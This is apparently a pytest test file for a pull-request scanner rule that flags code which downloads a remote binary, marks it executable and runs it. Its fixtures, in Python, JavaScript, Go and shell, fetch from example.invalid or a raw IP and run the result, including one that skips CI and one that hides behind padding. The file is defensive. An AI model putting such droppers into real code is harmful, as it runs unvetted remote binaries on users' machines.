import pytest

from pr_scanner.models import ChangedFile, Diff, Severity
from pr_scanner.rules import default_registry
from pr_scanner.rules.dropper import RemoteBinaryExec


def file(path, *lines, status="added"):
    return ChangedFile(path=path, status=status, added_lines=tuple(enumerate(lines, 1)))


def run(*files):
    return list(RemoteBinaryExec().evaluate(Diff("a" * 40, "b" * 40, tuple(files))))


PY_DROPPER = [
    "import os, subprocess, urllib.request",
    "if not os.environ.get('CI'):",
    "    urllib.request.urlretrieve('https://example.invalid/bin/helper', '/tmp/.helper')",
    "    os.chmod('/tmp/.helper', 0o755)",
    "    subprocess.Popen(['/tmp/.helper'])",
]


def test_ci_aware_download_and_exec_is_critical():
    (f,) = run(file("src/demo/telemetry.py", *PY_DROPPER))
    assert f.rule_id == "EXEC-DROPPER"
    assert f.severity == Severity.CRITICAL
    assert f.file == "src/demo/telemetry.py"
    assert f.line == 4  # first execution signal (chmod)
    assert "CI" in f.rationale and "download" in f.rationale.lower()
    assert f.remediation


def test_download_and_spawn_without_ci_check_is_high():
    (f,) = run(file("lib/run.py", "import subprocess, requests", "b = requests.get('https://example.invalid/b').content", "subprocess.run(['/tmp/b'])"))
    assert f.severity == Severity.HIGH


def test_download_and_chmod_without_spawn_is_high():
    (f,) = run(file("scripts/setup.sh", "curl -o /tmp/x https://example.invalid/b", "chmod +x /tmp/x"))
    assert f.severity == Severity.HIGH


def test_raw_ip_download_is_critical():
    (f,) = run(file("lib/run.py", "import subprocess, requests", "b = requests.get('http://203.0.113.7/b').content", "subprocess.run(['/tmp/b'])"))
    assert f.severity == Severity.CRITICAL


def test_ci_check_plus_spawn_is_medium():
    (f,) = run(file("tools/t.py", "if os.environ.get('CI'):", "    subprocess.run(['pytest'])"))
    assert f.severity == Severity.MEDIUM


def test_javascript_dropper():
    (f,) = run(
        file(
            "lib/init.js",
            "const cp = require('child_process');",
            "if (!process.env.CI) {",
            "  https.get('https://example.invalid/b', (r) => r.pipe(fs.createWriteStream('/tmp/b')));",
            "  fs.chmodSync('/tmp/b', 0o755);",
            "  cp.spawn('/tmp/b');",
            "}",
        )
    )
    assert f.severity == Severity.CRITICAL


def test_go_dropper():
    (f,) = run(file("main.go", "resp, _ := http.Get(\"https://example.invalid/b\")", "os.Chmod(\"/tmp/b\", 0755)", "exec.Command(\"/tmp/b\").Start()"))
    assert f.severity == Severity.HIGH


@pytest.mark.parametrize(
    "path,lines",
    [
        ("src/a.py", ["subprocess.run(['git', 'rev-parse', 'HEAD'])"]),  # spawn only
        ("src/a.py", ["r = requests.get('https://api.example.invalid/data')"]),  # download only
        ("src/a.py", ["if os.environ.get('CI'):", "    color = False"]),  # CI check only
        ("src/a.py", ["os.chmod(path, 0o644)"]),  # chmod only
        ("src/a.js", ["const m = re.exec(s);", "fetch('/api')"]),  # regex.exec is not a process spawn
    ],
)
def test_single_signals_are_not_reported(path, lines):
    assert run(file(path, *lines)) == []


def test_signals_may_be_on_different_lines():
    lines = ["import subprocess", "", "def go():", "    pass", "", "url = 'https://example.invalid/b'", "data = urlopen(url).read()", "", "subprocess.call(['x'])"]
    (f,) = run(file("src/a.py", *lines))
    assert f.severity == Severity.HIGH


def test_commented_out_code_is_ignored():
    assert run(file("src/a.py", "# subprocess.run(['x'])", "# requests.get('https://example.invalid')")) == []
    assert run(file("src/a.js", "// child_process.spawn('x')", "// fetch('https://example.invalid')")) == []


def test_one_finding_per_file():
    fs = run(file("a.py", *PY_DROPPER), file("b.py", *PY_DROPPER))
    assert sorted(f.file for f in fs) == ["a.py", "b.py"]


def test_setup_py_is_included():
    assert run(file("setup.py", "import subprocess, requests", "requests.get('https://example.invalid/b')", "subprocess.run(['/tmp/b'])"))


@pytest.mark.parametrize("path", ["README.md", "docs/install.txt", "package-lock.json", "logo.png"])
def test_non_code_files_are_ignored(path):
    assert run(file(path, *PY_DROPPER)) == []


def test_removed_and_binary_files_are_ignored():
    assert run(file("a.py", *PY_DROPPER, status="removed")) == []
    binary = ChangedFile(path="a.py", status="added", is_binary=True)
    assert run(binary) == []


def test_padding_a_line_does_not_hide_the_payload():
    # regression: rules used to truncate lines at 4000 chars, so padding evaded them
    pad = " " * 200_000
    (f,) = run(file("a.py", pad + "subprocess.run(['x'])", pad + "requests.get('https://example.invalid/b')"))
    assert f.severity == Severity.HIGH


def test_registered_by_default():
    assert "EXEC-DROPPER" in {r.id for r in default_registry().rules()}
